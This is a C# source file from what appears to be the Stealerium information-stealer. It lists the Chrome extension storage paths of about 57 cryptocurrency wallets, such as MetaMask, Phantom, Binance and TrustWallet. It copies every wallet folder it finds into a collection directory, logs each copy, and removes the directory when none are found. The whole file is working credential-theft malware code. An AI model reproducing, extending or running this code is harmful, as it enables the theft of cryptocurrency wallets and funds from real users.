using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal class Extensions
    {
        // Dictionary for storing wallet names and corresponding Chrome extension paths
        private static readonly Dictionary<string, string> ChromeWalletsDirectories = new Dictionary<string, string>
        {
            { "Chrome_Authenticator", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bhghoamapcdpbohphigoooaddinpkbai") },
            { "Chrome_Binance", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhbohimaelbohpjbbldcngcnapndodjp") },
            { "Chrome_Bitapp", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fihkakfobkmkjojpchpfgcmhfjnmnfpi") },
            { "Chrome_BoltX", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aodkkagnadcbobfpggfnjeongemjbjca") },
            { "Chrome_Coin98", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aeachknmefphepccionboohckonoeemg") },
            { "Chrome_Coinbase", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hnfanknocfeofbddgcijnmhnfnkdnaad") },
            { "Chrome_Core", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "agoakfejjabomempkjlepdflaleeobhb") },
            { "Chrome_Crocobit", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "pnlfjmlcjdjgkddecgincndfgegkecke") },
            { "Chrome_Equal", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "blnieiiffboillknjnepogjhkgnoapac") },
            { "Chrome_Ever", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cgeeodpfagjceefieflmdfphplkenlfk") },
            { "Chrome_ExodusWeb3", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aholpfdialjgjfhomihkjbmgjidlcdno") },
            { "Chrome_Fewcha", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ebfidpplhabeedpnhjnobghokpiioolj") },
            { "Chrome_Finnie", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cjmkndjhnagcfbpiemnkdpomccnjblmj") },
            { "Chrome_Guarda", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hpglfhgfnhbgpjdenjgmdgoeiappafln") },
            { "Chrome_Guild", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nanjmdknhkinifnkgdcggcfnhdaammmj") },
            { "Chrome_HarmonyOutdated", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fnnegphlobjdpkhecapkijjdkgcjhkib") },
            { "Chrome_Iconex", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "flpiciilemghbmfalicajoolhkkenfel") },
            { "Chrome_JaxxLiberty", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cjelfplplebdjjenllpjcblmjkfcffne") },
            { "Chrome_Kaikas", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "jblndlipeogpafnldhgmapagcccfchpi") },
            { "Chrome_KardiaChain", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "pdadjkfkgcafgbceimcpbkalnfnepbnk") },
            { "Chrome_Keplr", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "dmkamcknogkgcdfhhbddcghachkejeap") },
            { "Chrome_Liquality", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "kpfopkelmapcoipemfendmdcghnegimn") },
            { "Chrome_MEWCX", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nlbmnnijcnlegkjjpcfjclmcfggfefdm") },
            { "Chrome_MaiarDEFI", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "dngmlblcodfobpdpecaadgfbcggfjfnm") },
            { "Chrome_Martian", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "efbglgofoippbgcjepnhiblaibcnclgk") },
            { "Chrome_Math", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "afbcbjpbpfadlkmhmclhkeeodmamcflc") },
            { "Chrome_Metamask", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn") },
            { "Chrome_Metamask2", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm") },
            { "Chrome_Mobox", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fcckkdbjnoikooededlapcalpionmalo") },
            { "Chrome_Nami", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "lpfcbjknijpeeillifnkikgncikgfhdo") },
            { "Chrome_Nifty", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "jbdaocneiiinmjbjlgalhcelgbejmnid") },
            { "Chrome_Oxygen", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhilaheimglignddkjgofkcbgekhenbh") },
            { "Chrome_PaliWallet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "mgffkfbidihjpoaomajlbgchddlicgpn") },
            { "Chrome_Petra", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ejjladinnckdgjemekebdpeokbikhfci") },
            { "Chrome_Phantom", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa") },
            { "Chrome_Pontem", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "phkbamefinggmakgklpkljjmgibohnba") },
            { "Chrome_Ronin", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec") },
            { "Chrome_Safepal", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "lgmpcpglpngdoalbgeoldeajfclnhafa") },
            { "Chrome_Saturn", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkddgncdjgjfcddamfgcmfnlhccnimig") },
            { "Chrome_Slope", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "pocmplpaccanhmnllbbkpgfliimjljgo") },
            { "Chrome_Solfare", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "khacbfnclnjfjakompbldhceolaealdn") },
            { "Chrome_Sollet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhmfendgdocmcbmfikdcogofphimnkno") },
            { "Chrome_Starcoin", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "mfhbebgoclkghebffdldpobeajmbecfk") },
            { "Chrome_Swash", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "cmndjbecilbocjfkibfbifhngkdmjgog") },
            { "Chrome_TempleTezos", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ookjlbkiijinhpmnjffcofjonbfbgaoc") },
            { "Chrome_TerraStation", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "aiifbnbfobpmeekipheeijimdpnlpgpp") },
            { "Chrome_Tokenpocket", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "mfgccjchihfkkindfppnaooecgfneiii") },
            { "Chrome_Ton", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nphplpgoakhhjchkkhmiggakijnkhfnd") },
            { "Chrome_Tonkeeper", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ogaghekfbbibgpkeboogffmphcecpbga") },
            { "Chrome_Tron", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ibnejdfjmmkpcnlpebklmnkoeoihofec") },
            { "Chrome_TrustWallet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "egjidjbpglichdcondbcbdnbeeppgdph") },
            { "Chrome_Wombat", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "amkmjjmmflddogmhpjloimipbofnfjih") },
            { "Chrome_XDEFI", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hmeobnfnfcmdkdcmlblgagmfpfboieaf") },
            { "Chrome_XMR.PT", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "eigblbgjknlfbajkfhopmcojidlgcehm") },
            { "Chrome_XinPay", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bocpokimicclpaiekenaeelehdjllofo") },
            { "Chrome_Yoroi", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "ffnbelfdoeiohenkjibnmadjiehjhajb") },
            { "Chrome_iWallet", Path.Combine(Paths.Lappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "kncchdigobghenbbaddojjnnaogfppfj") }
        };

        // Main method to get Chrome wallets and save them to a directory
        public static void GetChromeWallets(string saveDirectory)
        {
            try
            {
                int walletsCopied = 0;

                // Iterate through each wallet directory in the dictionary and attempt to copy it
                foreach (var wallet in ChromeWalletsDirectories)
                {
                    walletsCopied += CopyWalletFromDirectoryTo(saveDirectory, wallet.Value, wallet.Key) ? 1 : 0;
                }

                // If no wallets were copied, delete the save directory
                if (walletsCopied == 0)
                {
                    Logging.Log("No wallets found in Chrome extensions.");
                    Filemanager.RecursiveDelete(saveDirectory);
                }
            }
            catch (Exception)
            {
                //
            }
        }

        // Helper method to copy wallet files from source directory to target directory
        private static bool CopyWalletFromDirectoryTo(string saveDirectory, string walletDirectory, string walletName)
        {
            try
            {
                // Check if the wallet directory exists
                if (!Directory.Exists(walletDirectory))
                {
                    return false;
                }

                // Create saveDirectory if it doesn't exist
                if (!Directory.Exists(saveDirectory))
                {
                    Directory.CreateDirectory(saveDirectory);
                }

                // Create destination directory and copy files
                var destinationDirectory = Path.Combine(saveDirectory, walletName);
                Directory.CreateDirectory(destinationDirectory);
                Filemanager.CopyDirectory(walletDirectory, destinationDirectory);

                // Log success and increment the wallet counter
                Logging.Log($"Copied wallet: {walletName} to {destinationDirectory}");
                Counter.BrowserWallets++;
                return true;
            }
            catch (Exception ex)
            {
                Logging.Log($"Error copying wallet {walletName}: {ex.Message}");
                return false;
            }
        }
    }
}
